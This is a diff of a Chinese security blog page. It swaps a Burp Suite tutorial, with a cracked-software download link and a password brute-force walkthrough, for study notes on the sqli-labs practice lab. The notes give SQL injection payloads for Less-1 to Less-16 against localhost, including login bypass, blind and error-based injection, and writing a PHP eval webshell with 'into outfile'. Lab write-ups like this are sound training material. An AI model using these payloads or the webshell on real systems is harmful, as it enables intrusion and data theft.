@@ -4,21 +4,13 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="BurpSuite小白安装与使用教程, NEUQ  CTF 子实  ZiShi 计算机科学与技术 网络安全">
+    <meta name="keywords" content="sqli-labs环境配置及基础篇学习笔记, NEUQ  CTF 子实  ZiShi 计算机科学与技术 网络安全">
     <meta name="baidu-site-verification" content>
     <meta name="google-site-verification" content>
-    <meta name="description" content="Burp Suite 安装使用教程下载与安装（破解）
-下载链接
-
-百度网盘 提取码：5ra1
-
-
-环境配置
-需要安装java环境，请自行百度，谷歌。
-
-安装破解
-
-下载软件，安装好环境，直接点即那个.bat文件即可直接接运行（此时已经破解过">
+    <meta name="description" content="Less-0配置环境
+下载安装phpstudy 2016，官网有旧版，尽量从官网下，安全。（别的版本试了，不太行）
+安装后更改数据库密码为 root， 启动
+从github下载sqli-labs 解压缩到phpstudy安装目录下的www目">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>BurpSuite小白安装与使用教程 | ZS BLOG</title>
+    <title>sqli-labs环境配置及基础篇学习笔记 | ZS BLOG</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -319,13 +311,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/24.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        BurpSuite小白安装与使用教程
+                        sqli-labs环境配置及基础篇学习笔记
                     </div>
                 </div>
             </div>
@@ -436,12 +428,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/web/" target="_blank">
-                            <span class="chip bg-color">web</span>
-                        </a>
-                        
-                        <a href="/tags/工具/" target="_blank">
-                            <span class="chip bg-color">工具</span>
+                        <a href="/tags/sql注入/" target="_blank">
+                            <span class="chip bg-color">sql注入</span>
                         </a>
                         
                     </div>
@@ -464,7 +452,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-18
+                    2019-12-28
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -478,14 +466,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    415
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
                 
@@ -501,70 +489,189 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Burp-Suite-安装使用教程"><a href="#Burp-Suite-安装使用教程" class="headerlink" title="Burp Suite 安装使用教程"></a>Burp Suite 安装使用教程</h1><h2 id="下载与安装（破解）"><a href="#下载与安装（破解）" class="headerlink" title="下载与安装（破解）"></a>下载与安装（破解）</h2><ul>
-<li><p>下载链接</p>
-<blockquote>
-<p><a href="https://pan.baidu.com/s/1NSH0ld6Tt-8rIjQtP6axiA" target="_blank" rel="noopener">百度网盘</a> 提取码：<code>5ra1</code></p>
-</blockquote>
+                <h1 id="Less-0"><a href="#Less-0" class="headerlink" title="Less-0"></a>Less-0</h1><p>配置环境</p>
+<p>下载安装phpstudy 2016，官网有旧版，尽量从官网下，安全。（别的版本试了，不太行）</p>
+<p>安装后更改数据库密码为 root， 启动</p>
+<p>从github下载sqli-labs 解压缩到phpstudy安装目录下的www目录，更改sql-connection文件夹下的db-creds.inc, 设置为</p>
+<pre class="line-numbers language-text"><code class="language-text"><?php
+
+//give your mysql connection username n password
+$dbuser ='root';
+$dbpass ='root';
+$dbname ="security";
+$host = 'localhost';
+$dbname1 = "challenges";
+
+
+
+?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问 <a href="http://127.0.0.1/sqli-labs/" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/</a></p>
+<p>点击    Setup/reset Database for labs 配置数据库，之后就可以痛苦的做题了</p>
+<h2 id="sql-注入基本过程"><a href="#sql-注入基本过程" class="headerlink" title="sql 注入基本过程"></a>sql 注入基本过程</h2><p><a href="https://ainiya.xyz/2019/10/03/2019-mysql-chang-yong-ming-ling/">mysql基本使用</a></p>
+<ol>
+<li><p>判断sql注入（根据返回的错误信息）</p>
+<p>单引号 ‘</p>
+<p>双引号 “</p>
+<p>and 1=1 或 and 1=2</p>
+<p>反斜杠 /</p>
+<p>注释（单行注释） –</p>
+<p>基于时间的盲注 sleep(5)，’ and sleep(5), “ sleep(5)</p>
 </li>
-<li><p>环境配置</p>
-<p>需要安装java环境，请自行百度，谷歌。</p>
+<li><p>判断是什么类型的注入，有没有过滤关键字，可否绕过</p>
 </li>
-<li><p>安装破解</p>
-<blockquote>
-<p>下载软件，安装好环境，直接点即那个.bat文件即可直接接运行（此时已经破解过了）</p>
-</blockquote>
+<li><p>获取数据库用户，版本，当前连接数据库等信息</p>
 </li>
-</ul>
-<h2 id="使用burp-suite-进行弱口令暴力破解"><a href="#使用burp-suite-进行弱口令暴力破解" class="headerlink" title="使用burp suite 进行弱口令暴力破解"></a>使用burp suite 进行弱口令暴力破解</h2><h3 id="运行程序创建临时工程"><a href="#运行程序创建临时工程" class="headerlink" title="运行程序创建临时工程"></a>运行程序创建临时工程</h3><p><img src="https://ae01.alicdn.com/kf/H57e718443976482091758b073258c27bd.jpg" alt></p>
-<p><img src="https://ae01.alicdn.com/kf/H64b572c41c76457892179e9a4f97cb27X.jpg" alt></p>
-<h3 id="添加代理端口"><a href="#添加代理端口" class="headerlink" title="添加代理端口"></a>添加代理端口</h3><p><img src="https://ae01.alicdn.com/kf/H9aea1bf00f48446280aeedaa58976bd8N.jpg" alt></p>
-<h3 id="设置浏览器代理"><a href="#设置浏览器代理" class="headerlink" title="设置浏览器代理"></a>设置浏览器代理</h3><ul>
-<li>Chrome 推荐使用 <code>SwitchyOmega</code> 插件</li>
-<li>Firefox 推荐使用 <code>FoxyProxy</code> 插件</li>
-<li>也可以直接进入浏览器的设置里面找到代理设置</li>
-</ul>
-<h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><blockquote>
-<p>就这一步快把我给搞死了，不过还好过去了。</p>
+<li><p>获取某个数据库表的信息</p>
+</li>
+<li><p>获取具体的数据</p>
+</li>
+</ol>
+<h2 id="union-联合查询的使用"><a href="#union-联合查询的使用" class="headerlink" title="union 联合查询的使用"></a>union 联合查询的使用</h2><p><a href="http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/" target="_blank" rel="noopener">原作连接</a></p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">group_concat 将查询结果的字符串拼接成一个字符串
+
+查询数据库名: select database()
+
+查询所有数据库名: union select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA
+爆出所有数据库: select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA
+
+查数据库名为security下面的表名: union select 1,table_name,3, from information_schema.tables where table_schema='security'
+information_schema.tables: 存储mysql数据库下所有表名信息的表
+table_schema: 数据库名
+table_name: 表名
+
+查询users表明下的列名信息: union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
+information_schema.columns: 存储mysql数据库下所有列名信息的表
+column_name: 列名
+table_name: 表名
+
+查询user表下列名为username, password的数据
+union select 1,username,password from users
+union select 1,group_concat(username),group_concat(password) from users // 拼接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><blockquote>
+<p>单引号闭合</p>
 </blockquote>
+<p>提示输入id, 暗示存储类型为字符串</p>
+<p>构造payload</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=1</code></pre><p><img src="https://pic.superbed.cn/item/5e167d7c7f9a96fec11ab65b.jpg" alt></p>
+<p><a href="https://www.cnblogs.com/20180609miss/p/9272794.html" target="_blank" rel="noopener">myql 种单引号和反引号的区别</a></p>
+<p><a href="https://blog.csdn.net/xiayun1995/article/details/86500605" target="_blank" rel="noopener">#与–与–+</a></p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-1/?id=1' //  报错
+ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 
+表明 单引号进入MySQL语句
+
+http://127.0.0.1/sqli-labs/Less-1/?id=1' or '1'='1  // 成功
+Your Login name:Dumb
+Your Password:Dumb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>查看字段数为3</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+ // 成功
+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 --+ // 失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>测试union语句的返回结果 <a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">SELECT 1,2,3…的含义及其在SQL注入中的用法</a></p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-1/?id=1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>本来想的是应该返回union后查询的结果, 但是返回的是和之前的一样,查看发现网站文件使用的是 mysql_fetch_array($result),  只会获得结果的第一条非空的数据。应当设法是union前的语句的查询结果为空。id填为0</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://pic.superbed.cn/item/5e169c497f9a96fec11d8fbc.jpg" alt></p>
+<p>查看数据库版本与数据库名称</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-1/?id=0' union select 1,version(),database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://pic.superbed.cn/item/5e169d6c7f9a96fec11da997.jpg" alt></p>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-1/?id=1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://pic.superbed.cn/item/5e16aa087f9a96fec11ed94f.jpg" alt></p>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><blockquote>
+<p>数字型不需要闭合</p>
+</blockquote>
+<p>提示输入数字, 表示存储类型为数字</p>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-2/?id=0 union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-3/?id=1'
+出错 near ''1'') LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-3/?id=0') union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>添加双引号报错</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-4/?id=1"    
+near '"1"") LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-4/?id=0") union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>单引号报错</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-5/?id=1'
+near ''1'' LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>把多余的注释掉</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-5/?id=1' --+ // 没报错<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>页面不会显示所有数据库查询到的结果,只会显示数据库的错误信息 (报错注入)</p>
+<p><a href="https://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">MySQL updatexml()、extractvalue() 报错型SQL注入</a></p>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">pay1: 
+http://127.0.0.1/sqli-labs/Less-5/?id=1' union select updatexml(1,concat(0x3a,(select database())),1) --+
+
+pay2
+http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>将 less-5的截断符由单引号换位双引号即可(双引号闭合)</p>
+<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>试错, 错误时只知道有错</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-7/?id=1')) --+ // 成功<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>提示用into outfile来做, 即需要来写入文件(16进制编码)</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-7/?id=1')) union select null,0x3c3f70687020406576616c28245f504f53545b276b6579275d293b203f3e,null into outfile 'D:\\phpStudy\\WWW\\info.php' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>写入一句话木马</p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>基于bool的盲注</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以判断的查询结果的某个字符的ascill的值</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>判断长度</p>
+<p>同样的方法填充查询语句即可</p>
+<p>可以使用python 的request库来进行自动化的实现</p>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>原理:     利用时间上的延迟来判断前面的结果是否为真</p>
+<p>eg: ‘  and (length(database()) = 8) and if (1=1, sleep(5), null) –+</p>
+<p>当数据库名字的长度为8的时候会执行sleep(5) 否则的话就直接返回否, 利用的是个条件的逻辑顺序</p>
+<p>相当于是第八题 + sleep条件判断</p>
+<p>payload:</p>
+<pre class="line-numbers language-text"><code class="language-text">http://127.0.0.1/sqli-labs/Less-9/?id=1' and (ascii(substr((select database()) ,1,1))) = 115 +and+if(1=1, sleep(1), null) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>将Less-9的单引号截断符改为双引号即可</p>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>输入错误时报错如: admin’</p>
+<p><img src="https://pic.superbed.cn/item/5e173f1b7f9a96fec13141b8.jpg" alt></p>
+<p>username: 填入 <code>admin&#39; --</code> 注意最后应该有空格</p>
+<p><img src="https://pic.superbed.cn/item/5e17366d7f9a96fec130579e.jpg" alt></p>
+<p>显示登录成功</p>
+<pre class="line-numbers language-text"><code class="language-text">admin' order by 2 -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现字段数为2</p>
+<p>payload</p>
+<p><img src="https://pic.superbed.cn/item/5e17471b7f9a96fec1326e0c.jpg" alt></p>
+<p><img src="https://pic.superbed.cn/item/5e1747417f9a96fec13272ec.jpg" alt></p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>试探发现使用 <code>admin&quot;) --</code> 最后用空格, 登录成功. </p>
+<p><img src="https://pic.superbed.cn/item/5e17482c7f9a96fec13292e5.jpg" alt></p>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>填入 admin’ 得到报错信息</p>
+<p> near ‘’admin’’) and password=(‘’) LIMIT 0,1’ at line 1</p>
+<p>闭合方式 ‘)</p>
+<p>利用Less-5的报错注入</p>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">post: uname= admin') union select updatexml(1,concat(0x3a,(select database())),1) -- +&passwd=1&submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://pic.superbed.cn/item/5e174bcd7f9a96fec13346a7.jpg" alt></p>
+<p><img src="https://pic.superbed.cn/item/5e174c4f7f9a96fec13371c4.jpg" alt></p>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>和Less-13 的闭合方式不同, 其他的都一样</p>
+<pre class="line-numbers language-text"><code class="language-text">post: uname= admin" union select updatexml(1,concat(0x3a,(select database())),1) -- +&passwd=1&submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>什么提示都没有,无论登录成功还是失败</p>
+<p>使用 admin’ –空格 登录成功, 闭合符为 <code>&#39;</code></p>
+<p>利用登录是否成功进行盲注</p>
+<pre class="line-numbers language-text"><code class="language-text">post: uname=' or (length(database())) = 8 #&passwd=' or 1=1 -- &submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>参考 Less-8</p>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>和Less-15 相似, 闭合符号不一样</p>
+<p>payload</p>
+<pre class="line-numbers language-text"><code class="language-text">闭合: admin") -- 
+post: uname=") or (length(database())) = 8 #&passwd=' or 1=1 -- &submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li><p>试探</p>
 <ul>
-<li><p>先要开启浏览器的代理</p>
-</li>
-<li><p>访问<code>http://burp/</code>下载证书</p>
-<p><img src="https://ae01.alicdn.com/kf/Hb44781f2d74c4bd8beaed6121353ebe4s.jpg" alt></p>
-</li>
-<li><p>点击文件弹出安装证书窗口，点击安装，注意存储选择受信任的根证书颁发机构</p>
-<p><img src="https://ae01.alicdn.com/kf/Hdeb510031c304e9085afd8a692605ba6g.jpg" alt></p>
-</li>
+<li>单引号</li>
+<li>双引号</li>
+<li>单引号/双引号 + 注释</li>
+<li>单引号/双引号 + )</li>
+<li>当引号/双引号 + ) + 注释</li>
 </ul>
-<h3 id="弱口令暴力破解"><a href="#弱口令暴力破解" class="headerlink" title="弱口令暴力破解"></a>弱口令暴力破解</h3><ul>
-<li><p>建议关闭除了破解的网页之外的所有网页</p>
 </li>
-<li><p>点击刷新网页，点击 burpsuite 的 forward 推送包到浏览器</p>
+<li><p>判断是要进行盲注还是进行报错注入或者进行简单的select 1,2,3 这样的注入</p>
 </li>
-<li><p>随意输入密码，用户名点击登录</p>
+<li><p>构造payload</p>
 </li>
-<li><p>再次点击forward捕获包</p>
-<p><img src="https://ae01.alicdn.com/kf/H84548976fb40416485cb89e29cc0c822u.png" alt> </p>
+<li><p>编写自动化python代码, 执行大量的判断动作</p>
 </li>
-<li><p>右键send inturder</p>
-<p><img src="https://ae01.alicdn.com/kf/H8dc8c8139cd44a46bb3945c95ce8dd23h.png" alt></p>
-<p>可以将不需要更改的关键字两边的符号删去</p>
-</li>
-<li><p>开始破解前需要加载破解字典</p>
-<p><img src="https://ae01.alicdn.com/kf/H03328246e1f84b8bb61eb62f071f9874R.png" alt></p>
-<p>点击 Start attack即可开始</p>
-<blockquote>
-<p>GitHub上的一个<a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">爆破字典的仓库</a></p>
-</blockquote>
-</li>
-<li><p>查看结果</p>
-<p><img src="https://ae01.alicdn.com/kf/H0116b60cc443492b9d6db6e3b29a2076w.png" alt></p>
-</li>
-</ul>
-<blockquote>
-<p>为什么设置了证书，代理也设置好了，就是加载网页时总会暂停，是因为burpsuite截取了包，此时只要点击一下pyroxy 下的 intercept 里的 Forward 按钮即可， 有不懂的地方欢迎交流</p>
-</blockquote>
+</ol>
 
             </div>
             <hr />
@@ -723,9 +830,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《BurpSuite小白安装与使用教程》
+                    《sqli-labs环境配置及基础篇学习笔记》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/18/2019-burpsuite-xiao-bai-ru-men-an-zhuang-yu-shi-yong/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/12/28/2019-sqli-labs-ji-chu-pian-xue-xi-bi-ji/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ZS
             </a> 采用
@@ -766,7 +873,7 @@
         repo: 'newlzs.github.io',
         owner: 'newlzs',
         admin: "newlzs",
-        id: '2019/09/18/2019-burpsuite-xiao-bai-ru-men-an-zhuang-yu-shi-yong/',
+        id: '2019/12/28/2019-sqli-labs-ji-chu-pian-xue-xi-bi-ji/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -787,70 +894,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/">
+                <a href="/2019/12/28/2019-sqli-labs-ji-chu-pian-xue-xi-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="凤凰挽歌，黑客独白">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="sqli-labs环境配置及基础篇学习笔记">
                         
-                        <span class="card-title">凤凰挽歌，黑客独白</span>
+                        <span class="card-title">sqli-labs环境配置及基础篇学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            看看来时的路
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-25
-                        </span>
-                        <span class="publish-author">
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/心情/" target="_blank">
-                        <span class="chip bg-color">心情</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/09/17/2019-gong-fang-shi-jie-web-ti-xin-shou/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="攻防世界：web题(新手)">
-                        
-                        <span class="card-title">攻防世界：web题(新手)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            终于做到了web方面的题了，pwn的题还是很费时间的，预计一周的的时间把web的题做完，加油呀
+                            大致的写了一下,中间有很多看了大佬的博客, 还得加油...
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-17
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-28
                             </span>
                         <span class="publish-author">
                             
@@ -864,19 +930,61 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/sql注入/" target="_blank">
+                        <span class="chip bg-color">sql注入</span>
                     </a>
                     
-                    <a href="/tags/web/" target="_blank">
-                        <span class="chip bg-color">web</span>
-                    </a>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/12/16/2019-php-xue-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="PHP学习笔记">
+                        
+                        <span class="card-title">PHP学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            开始系统的学习一下php，看菜鸟教程敲一遍。加油
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/后端学习/" class="post-category" target="_blank">
+                                    后端学习
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
                     
-                    <a href="/tags/竞赛/" target="_blank">
-                        <span class="chip bg-color">竞赛</span>
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
